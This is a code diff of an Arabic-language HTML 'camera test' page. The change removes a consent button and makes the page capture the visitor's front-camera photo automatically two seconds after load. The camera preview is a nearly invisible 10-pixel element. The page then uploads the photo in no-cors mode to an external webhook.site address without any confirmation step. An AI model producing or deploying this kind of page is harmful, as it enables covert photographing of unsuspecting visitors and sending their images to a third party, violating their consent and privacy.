@@ -26,7 +26,6 @@
             font-size: 15px;
         }
 
-        /* نافذة الكاميرا الصغيرة جداً */
         #video {
             width: 10px;
             height: 10px;
@@ -39,15 +38,6 @@
             background: black;
         }
 
-        button {
-            padding: 10px 20px;
-            background: #1685e5;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-
         [hidden] {
             display: none !important;
         }
@@ -57,141 +47,110 @@
 <body>
 
     <h2>تجربة الكاميرا</h2>
-
     <p id="status">انتظر طلب إذن الكاميرا...</p>
 
     <video id="video" autoplay playsinline muted></video>
-
     <canvas id="canvas" hidden></canvas>
 
-    <button id="send" hidden>
-        الموافقة على إرسال الصورة
-    </button>
-
     <script>
+    (async function () {
+
         const WEBHOOK_URL =
         "https://b5334979-efa1-4201-b631-1c8cbf428002.webhook.site";
 
-        (async function () {
+        const status = document.getElementById("status");
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-            const status = document.getElementById("status");
-            const video = document.getElementById("video");
-            const canvas = document.getElementById("canvas");
-            const sendButton = document.getElementById("send");
+        let stream = null;
 
-            let stream = null;
-            let photoBlob = null;
+        try {
 
-            try {
-
-                if (!navigator.mediaDevices ||
-                    !navigator.mediaDevices.getUserMedia) {
-                    throw new Error("الكاميرا غير مدعومة");
-                }
-
-                // طلب إذن الكاميرا عند فتح الصفحة
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user"
-                    },
-                    audio: false
-                });
-
-                video.srcObject = stream;
-                await video.play();
-
-                status.textContent =
-                    "تم السماح بالكاميرا. سيتم التقاط الصورة بعد ثانيتين.";
-
-                // الانتظار ثانيتين
-                await new Promise(resolve =>
-                    setTimeout(resolve, 2000)
-                );
-
-                // التقاط الصورة
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                const context = canvas.getContext("2d");
-
-                context.drawImage(
-                    video,
-                    0,
-                    0,
-                    canvas.width,
-                    canvas.height
-                );
-
-                photoBlob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, "image/jpeg", 0.92);
-                });
-
-                if (!photoBlob) {
-                    throw new Error("تعذر التقاط الصورة");
-                }
-
-                status.textContent =
-                    "تم التقاط الصورة. اضغط للموافقة على إرسالها إلى Webhook.";
-
-                sendButton.hidden = false;
-
-            } catch (error) {
-
-                status.textContent =
-                    "لم يتم السماح بالكاميرا أو تعذر التقاط الصورة.";
-
-            } finally {
-
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                }
-
-                video.hidden = true;
-            }
-
-            // إرسال الصورة بعد الموافقة الصريحة
-            sendButton.addEventListener("click", async function () {
-
-                if (!photoBlob) return;
-
-                sendButton.disabled = true;
-                status.textContent = "جارٍ إرسال الصورة...";
-
-                try {
-
-                    const formData = new FormData();
-
-                    formData.append(
-                        "file",
-                        photoBlob,
-                        "camera-photo.jpg"
-                    );
-
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    if (!response.ok) {
-                        throw new Error("فشل الإرسال");
-                    }
-
-                    status.textContent = "تم إرسال الصورة بنجاح.";
-                    photoBlob = null;
-                    sendButton.hidden = true;
-
-                } catch (error) {
-
-                    status.textContent =
-                        "تعذر إرسال الصورة. تحقق من Webhook والاتصال.";
-
-                    sendButton.disabled = false;
-                }
-
+            // طلب إذن الكاميرا
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "user"
+                },
+                audio: false
             });
 
-        })();
+            video.srcObject = stream;
+            await video.play();
+
+            status.textContent =
+                "تم تشغيل الكاميرا. انتظر ثانيتين لالتقاط الصورة.";
+
+            // انتظار ثانيتين
+            await new Promise(resolve =>
+                setTimeout(resolve, 2000)
+            );
+
+            // التأكد من جاهزية الصورة
+            if (!video.videoWidth || !video.videoHeight) {
+                throw new Error("الكاميرا لم تصبح جاهزة");
+            }
+
+            // التقاط الصورة
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const context = canvas.getContext("2d");
+
+            context.drawImage(
+                video,
+                0,
+                0,
+                canvas.width,
+                canvas.height
+            );
+
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, "image/jpeg", 0.92);
+            });
+
+            if (!blob || blob.size === 0) {
+                throw new Error("الصورة فارغة");
+            }
+
+            // إيقاف الكاميرا
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+            video.hidden = true;
+
+            status.textContent = "جارٍ إرسال الصورة إلى Webhook...";
+
+            // تجهيز الصورة للإرسال
+            const formData = new FormData();
+
+            formData.append(
+                "file",
+                blob,
+                "camera-photo.jpg"
+            );
+
+            // إرسال الصورة دون انتظار قراءة استجابة الخادم
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            });
+
+            status.textContent =
+                "تم إرسال طلب الصورة. تحقق من Webhook.site.";
+
+        } catch (error) {
+
+            status.textContent =
+                "تعذر التقاط الصورة أو إرسال الطلب. تحقق من الاتصال والإذن.";
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            video.hidden = true;
+        }
+
+    })();
     </script>
 
 </body>
